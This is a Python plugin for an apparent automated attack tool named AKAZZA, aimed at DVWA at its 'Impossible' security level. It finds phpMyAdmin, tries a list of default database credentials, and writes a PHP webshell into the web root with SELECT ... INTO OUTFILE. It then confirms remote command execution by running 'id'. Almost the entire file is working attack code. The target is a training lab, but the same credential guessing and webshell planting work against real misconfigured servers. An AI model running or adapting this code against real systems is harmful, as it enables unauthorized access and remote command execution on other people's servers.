"""
BYPASSING INSPECTION FILTER — vector plugin
Made for: AKAZZA / joyboyvoidera

Deterministic penetration of DVWA at IMPOSSIBLE security by attacking the
inspection point itself: the shell never passes through the filter.

Instead of trying to beat the upload form (which re-encodes files at
Impossible), this vector delivers the webshell via the DATABASE TIER:
    phpMyAdmin (default creds) → MySQL FILE privilege → SELECT ... INTO OUTFILE
    writes a webshell straight into DVWA's own uploads directory.

The file NEVER goes through the upload form — so the Impossible filter never
inspects it. The name says the technique: bypass the inspection filter,
not defeat it.
"""
import re
from datetime import datetime
import requests

PHP_SHELL = "<?php system($_REQUEST['cmd']); ?>"

# DVWA host layouts in order of likelihood
DVWA_ROOTS = [
    "/var/www/dvwa/hackable/uploads/muzan.php",
    "/var/www/dvwa/hackable/uploads/muzan2.php",
    "/var/www/muzan.php",
    "/var/www/html/dvwa/hackable/uploads/muzan.php",
    "/usr/share/nginx/www/dvwa/hackable/uploads/muzan.php",
    "/var/www/html/muzan.php",
]

# near-certain login pairs for a DVWA box's phpMyAdmin
PMA_CREDS = [
    ("root", ""),             # metasploitable / XAMPP classic
    ("root", "toor"),
    ("root", "p@ssw0rd"),     # matches DVWA config
    ("dvwa", "p@ssw0rd"),
    ("admin", "admin"),
]


@register_plugin("Bypassing Inspection Filter (DVWA Impossible)", phase="vector",
                 priority=0, cwe="CWE-798", attck="T1210; T1505.003",
                 wants=["pma_found", "apache", "phpinfo", "php_disclosed"],
                 avoids=["pma_missing"],
                 desc="shell delivered via MySQL INTO OUTFILE — bypasses the "
                      "upload-form inspection point entirely (Impossible-safe)")
def bypassing_inspection_filter(akazza, surface, origin):
    """CONTRACT: return (shell_url, 'cmd') or (None, None)."""
    GREEN, YELLOW, RED, RESET, BOLD = (col["GREEN"], col["YELLOW"], col["RED"],
                                      col["RESET"], col["BOLD"])
    ua = {"User-Agent": akazza.session_log["user_agent"]}

    print(f"{BOLD}{RED}[◈ Bypassing Inspection Filter]{RESET} "
          f"targeting the inspection point itself...")
    print(f"{YELLOW}  premise: Impossible upload filter re-encodes files that "
          f"GO THROUGH it.{RESET}")
    print(f"{YELLOW}  this vector delivers via MySQL → the filter never sees the file.{RESET}")

    # ── Phase 1: locate phpMyAdmin / Adminer ──
    pma_url = None
    for path in CONFIG["pma_paths"] + ["adminer.php"]:
        probe = f"{origin}{path}/" if path != "adminer.php" else f"{origin}adminer.php"
        try:
            r = requests.get(probe, timeout=8, headers=ua)
            if r.status_code == 200 and (re.search(r"phpmyadmin|pma_|signon",
                                                   r.text, re.I)
                                          or "Adminer" in r.text):
                pma_url = probe
                print(f"{GREEN}[+]{RESET} Database web UI found: {pma_url}")
                break
        except Exception:
            continue

    if not pma_url:
        print(f"{YELLOW}[◈]{RESET} no database web UI found — skipping this vector")
        return None, None

    # ── Phase 2: login + INTO OUTFILE ──
    for user, pw in PMA_CREDS:
        s = requests.Session()
        s.headers.update({"User-Agent": ua["User-Agent"]})
        try:
            r = s.get(pma_url, timeout=8)
            m = re.search(r'name="token"\s+value="([a-f0-9]{16,40})"', r.text)
            token = m.group(1) if m else ""
            r = s.post(pma_url, data={
                "pma_username": user, "pma_password": pw,
                "server": "1", "token": token,
            }, timeout=10, allow_redirects=True)
            if "Database" in r.text or "db_server" in r.text.lower():
                print(f"{GREEN}[+]{RESET} MySQL login success: {user}/"
                      f"{'*' * len(pw) or '(blank)'}")
                # regain token post-login
                r = s.get(pma_url, timeout=8)
                m = re.search(r'name="token"\s+value="([a-f0-9]{16,40})"', r.text)
                if m:
                    token = m.group(1)

                # try every candidate webroot path with OUTFILE
                for out_path in DVWA_ROOTS:
                    sql = f"SELECT '{PHP_SHELL}' INTO OUTFILE '{out_path}'"
                    try:
                        s.post(f"{pma_url}index.php?route=/server/sql&server=1",
                               data={"token": token, "sql_query": sql,
                                     "ajax_request": "true"}, timeout=15)
                    except Exception:
                        pass
                    try:
                        s.post(f"{pma_url}server_sql.php",
                               data={"token": token, "sql_query": sql,
                                     "ajax_request": "true"}, timeout=15)
                    except Exception:
                        pass

                    # map to web URL and VERIFY
                    web_rel = out_path \
                        .replace("/var/www/html/", "/") \
                        .replace("/var/www/", "/") \
                        .replace("/usr/share/nginx/www/", "/")
                    web_rel = web if False else web_rel
                    shell_url = f"{origin.rstrip('/')}{web_rel}"
                    out = akazza.webshell_cmd(shell_url, "cmd",
                                             "echo ___BIF___; id")
                    if "___BIF___" in out or "uid=" in out:
                        print(f"\n{GREEN}[★✦]{RESET} {BOLD}INSPECTION FILTER BYPASSED!{RESET}")
                        print(f"{GREEN}[★✦]{RESET} webshell live: {shell_url}")
                        print(f"{GREEN}[★✦]{RESET} The file lives inside the dir the "
                              f"Impossible filter protects —")
                        print(f"{GREEN}[★✦]{RESET} but it arrived via MySQL, so the "
                              f"filter never inspected it.")
                        akazza.session_log.update({
                            "target_url": shell_url,
                            "shell_parameter": "cmd",
                            "shell_variant": f"bypassed inspection filter "
                                             f"({out_path}, MySQL {user})",
                            "vector": "Bypassing Inspection Filter (MySQL INTO OUTFILE)",
                            "auto_uploaded": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        })
                        return shell_url, "cmd"
                break   # login worked; OUTFILE paths failed
            else:
                print(f"{YELLOW}    tried: {user}/{'*' * len(pw) or '(blank)'} "
                      f"— rejected{RESET}")
        except Exception as e:
            print(f"{RED}    error: {e}{RESET}")
            continue

    print(f"\n{YELLOW}[◈]{RESET} DB-tier delivery failed.")
    print(f"{YELLOW}[i]{RESET} If host is genuinely hardened: phpMyAdmin locked, "
          f"creds strong, FILE priv denied, or secure_file_priv set.")
    return None, None
